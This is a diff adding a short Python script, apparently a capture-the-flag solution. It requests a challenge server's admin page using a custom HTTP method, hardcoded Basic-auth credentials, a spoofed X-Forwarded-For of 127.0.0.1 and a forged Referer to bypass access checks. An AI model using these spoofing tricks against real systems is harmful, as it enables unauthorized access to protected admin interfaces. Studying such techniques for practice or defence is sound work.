@@ -1,0 +1,32 @@
+from base64 import b64encode
+import time
+import requests
+from requests.exceptions import ReadTimeout, ConnectTimeout
+
+login_url = 'http://140.115.59.7:12002/admin'
+
+login_headers = {
+    "Host": "140.115.59.7:12002",
+    "Cache-Control": "max-age=0",
+    "Authorization": None,
+    "X-Forwarded-For": "127.0.0.1",
+    "Referer": "https://www.adlSecurity.com",
+    "Upgrade-Insecure-Requests": "1",
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    # "Referer": "http://140.115.59.7:12002/",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,ja;q=0.6,zh-CN;q=0.5,yo;q=0.4",
+    "Connection": "close"
+}
+
+
+def set_login(username, password):
+    authorization = b64encode(f"{username}:{password}".encode('utf-8')).decode('ascii')
+    login_headers["Authorization"] = f"Basic {authorization}"
+
+
+set_login("hitori", "hitorijanai")
+response = requests.request("GIVEMEFLAG", login_url, headers=login_headers, timeout=5)
+print(response.text)
+
